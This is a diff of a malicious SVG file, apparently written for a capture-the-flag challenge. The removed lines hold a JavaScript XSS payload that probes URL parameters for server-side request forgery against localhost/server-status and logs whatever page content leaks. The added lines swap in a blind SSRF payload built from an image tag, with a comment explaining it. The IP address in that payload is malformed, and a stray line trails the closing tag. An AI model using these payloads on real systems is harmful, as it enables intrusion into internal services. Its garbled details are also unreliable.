@@ -1,40 +1,5 @@
-<svg width="200" height="200" xmlns="http://www.w3.org/2000/svg">
-<script type="text/javascript">
-    //<![CDATA[
-    (async function() {
-        console.log('[+] SVG XSS Successful! Starting SSRF probe...');
+<svg width="200" height="200" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+    <!--     This payload attempts a "blind" SSRF attack.    It tells the browser to load an image. The URL for that image points back     to the main challenge site, but with the 'url' parameter set to the internal     server-status page.    If the server is vulnerable, it will fetch its own status page.    We won't see the result directly, but this might be what the challenge expects.  -->
+    <image xlink:href="http://10.129246.228/?url=http://localhost/server-status" width="200" height="200" /></svg>
+SVG namespace
  
-        const ssrfParams = ['url', 'uri', 'page', 'site', 'dest', 'redirect', 'host', 'view'];
-        const internalUrl = 'http://localhost/server-status';
-        const successKeyword = 'Apache Server Status';
- 
-        async function testParam(param) {
-            const probeUrl = `${window.location.origin}/?${param}=${encodeURIComponent(internalUrl)}`;
-            console.log(`[+] Testing URL: ${probeUrl}`);
- 
-            try {
-                const response = await fetch(probeUrl);
-                const responseText = await response.text();
- 
-                if (responseText.includes(successKeyword)) {
-                    console.log(`%c[SUCCESS] Found vulnerable parameter: '${param}'`, 'color: green; font-size: 20px;');
-                    console.log('[SUCCESS] Leaked page content below:');
-                    console.log(responseText);
-                    return true;
-                } else {
-                    console.log(`[-] Parameter '${param}' did not work.`);
-                }
-            } catch (error) {
-                console.error(`[-] Error testing parameter '${param}':`, error);
-            }
-            return false;
-        }
- 
-        for (const param of ssrfParams) {
-            const found = await testParam(param);
-            if (found) break;
-        }
-    })();
-    //]]>
-</script>
-</svg>
